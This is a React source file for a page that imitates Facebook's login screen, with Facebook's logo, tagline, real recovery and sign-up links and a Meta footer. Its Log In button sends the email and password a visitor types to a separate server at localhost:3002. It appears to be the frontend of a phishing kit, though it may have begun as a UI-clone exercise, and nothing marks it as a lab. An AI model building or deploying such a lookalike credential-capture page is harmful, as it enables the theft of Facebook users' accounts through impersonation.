import React, { useState } from "react";
const axios = require('axios');
function App() {

  const [cuerremil, setEmail] = useState("");
  const [cuerrpass, setpass] = useState("");
  function intF(e) {
    setEmail(e.target.value);
  }
  function passF(e) {
    setpass(e.target.value);
  }
  const reg = () => {
    axios.post("http://localhost:3002", {
      email: cuerremil,
      password: cuerrpass,
    }).then((response) => {
      console.warn(response)
    })
    setEmail("");
    setpass("");
  }


  return (
    <>
      <div className="main_div">
        <div className="fblog">
          <div className="fblogo">
            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="facebook" />
            <h2>Facebook helps you connect and share with the people in your life.</h2>
          </div>
          <div className="log_div">
            <div className="logIN">
              <div className="main_log" >
                <input type="text" value={cuerremil} onChange={intF} placeholder="Email address or phone number" name="email" />
                <br />
                <input type="password" value={cuerrpass} onChange={passF} placeholder="Password" name="password" />
                <br />
                <button className="logbtn" type="submit" onClick={reg} >Log In</button>
                <br />
                <div className="forg">
                  <a href="https://www.facebook.com/login/identify/?ctx=recover&ars=facebook_login&from_login_screen=0">Forgotten password?</a>
                </div>
              </div>
              <div className="border">
              </div>
              <div className="cbtn">
                <button className="createbtn"><a href="https://www.facebook.com/r.php?locale=en_GB&display=page">Create New Account</a></button>
              </div>
            </div>
            <div className="create">
              <p style={{ marginLeft: "10px" }}><b>Create a Page</b> for a celebrity, brand or business.</p>
            </div>
          </div>
        </div>

      </div>
      <div className="footer">
        <div>
          <ul>
            <li style={{ "paddingLeft": "0%" }}><a href="/facebook">English (UK)</a></li>
            <li><a href="https://hi-in.facebook.com/login/">हिन्दी</a></li>
            <li><a href="https://ur-pk.facebook.com/login/">اردو</a></li>
            <li><a href="https://pa-in.facebook.com/login/">ਪੰਜਾਬੀ</a></li>
            <li><a href="https://bn-in.facebook.com/login/">বাংলা</a></li>
            <li><a href="https://gu-in.facebook.com/login/">ગુજરાતી</a></li>
            <li><a href="https://mr-in.facebook.com/login/">मराठी</a></li>
            <li><a href="https://ta-in.facebook.com/login/">தமிழ்</a></li>
            <li><a href="https://te-in.facebook.com/login/">తెలుగు</a></li>
            <li><a href="https://ml-in.facebook.com/login/">മലയാളം</a></li>
            <li><a href="https://te-in.facebook.com/login/">ಕನ್ನಡ</a></li>
            <button>+</button>
          </ul>
          <div className="meta" >
          </div>
          <div>
            <h5>Meta©2022</h5>
          </div>
        </div>

      </div>
    </>
  )
}
export default App;